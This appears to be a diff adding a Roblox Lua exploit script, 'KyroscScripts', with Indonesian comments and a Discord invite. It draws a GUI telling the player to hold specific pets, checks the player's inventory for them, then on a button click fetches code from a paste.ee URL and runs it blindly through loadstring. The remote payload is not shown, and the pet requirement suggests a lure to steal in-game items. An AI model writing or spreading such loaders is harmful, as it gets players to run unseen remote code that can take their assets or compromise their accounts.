@@ -1,0 +1,154 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
+
+-- Membuat ScreenGui utama
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "KyroscScriptsGUI"
+screenGui.Parent = gui
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Membuat frame utama
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 300, 0, 180)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+-- Membuat corner radius
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = mainFrame
+
+-- Membuat judul
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Text = "KyroscScripts (v3.2.1)"
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.Parent = mainFrame
+
+-- Membuat teks pet instructions
+local petInstructions = Instance.new("TextLabel")
+petInstructions.Name = "PetInstructions"
+petInstructions.Text = "Hold one of these pets:\n- Red Fox - Dragonfly\n- Raccoon - Praying Mantis\nThen click to start."
+petInstructions.Size = UDim2.new(0.9, 0, 0, 80)
+petInstructions.Position = UDim2.new(0.05, 0, 0, 40)
+petInstructions.BackgroundTransparency = 1
+petInstructions.TextColor3 = Color3.fromRGB(200, 200, 200)
+petInstructions.Font = Enum.Font.Gotham
+petInstructions.TextSize = 13
+petInstructions.TextXAlignment = Enum.TextXAlignment.Left
+petInstructions.TextYAlignment = Enum.TextYAlignment.Top
+petInstructions.Parent = mainFrame
+
+-- Membuat tombol "Start"
+local startButton = Instance.new("TextButton")
+startButton.Name = "StartButton"
+startButton.Text = "Start Execution"
+startButton.Size = UDim2.new(0.9, 0, 0, 40)
+startButton.Position = UDim2.new(0.05, 0, 0, 130)
+startButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+startButton.BorderSizePixel = 0
+startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+startButton.Font = Enum.Font.GothamBold
+startButton.TextSize = 14
+startButton.Parent = mainFrame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 6)
+buttonCorner.Parent = startButton
+
+-- Membuat footer
+local footer = Instance.new("TextLabel")
+footer.Name = "Footer"
+footer.Text = "KyroscScripts | discord.gg/SqqvAH7nXf"
+footer.Size = UDim2.new(1, 0, 0, 20)
+footer.Position = UDim2.new(0, 0, 1, -20)
+footer.BackgroundTransparency = 1
+footer.TextColor3 = Color3.fromRGB(150, 150, 150)
+footer.Font = Enum.Font.Gotham
+footer.TextSize = 12
+footer.Parent = mainFrame
+
+-- Fungsi untuk menampilkan notifikasi
+local function showNotification(message, color)
+    local notification = Instance.new("TextLabel")
+    notification.Name = "Notification"
+    notification.Text = message
+    notification.Size = UDim2.new(0.8, 0, 0, 40)
+    notification.Position = UDim2.new(0.5, 0, 0, -50)
+    notification.AnchorPoint = Vector2.new(0.5, 0)
+    notification.BackgroundColor3 = color
+    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
+    notification.Font = Enum.Font.GothamBold
+    notification.TextSize = 14
+    notification.Parent = mainFrame
+    
+    local notifCorner = Instance.new("UICorner")
+    notifCorner.CornerRadius = UDim.new(0, 6)
+    notifCorner.Parent = notification
+    
+    delay(3, function()
+        notification:Destroy()
+    end)
+end
+
+-- Fungsi untuk memeriksa pet
+local function hasValidPet()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local validPets = {"Red Fox", "Raccoon", "Dragonfly", "Praying Mantis"}
+    
+    -- Cek di karakter
+    for _, tool in ipairs(character:GetChildren()) do
+        if tool:IsA("Tool") and table.find(validPets, tool.Name) then
+            return true
+        end
+    end
+    
+    -- Cek di backpack
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") and table.find(validPets, tool.Name) then
+                return true
+            end
+        end
+    end
+    
+    return false
+end
+
+-- Fungsi untuk menjalankan script eksternal
+local function executeExternalScript()
+    showNotification("Checking for pets...", Color3.fromRGB(0, 100, 255))
+    
+    if not hasValidPet() then
+        showNotification("No valid pet found!", Color3.fromRGB(255, 50, 50))
+        return
+    end
+    
+    showNotification("Executing script...", Color3.fromRGB(0, 150, 0))
+    
+    -- Jalankan script langsung dari paste.ee
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://paste.ee/r/s7TguhY5"))()
+    end)
+    
+    if success then
+        showNotification("Script executed!", Color3.fromRGB(0, 200, 0))
+    else
+        showNotification("Error: "..tostring(err), Color3.fromRGB(255, 50, 50))
+        warn("Execution error: "..tostring(err))
+    end
+end
+
+-- Hubungkan fungsi ke tombol
+startButton.MouseButton1Click:Connect(executeExternalScript)
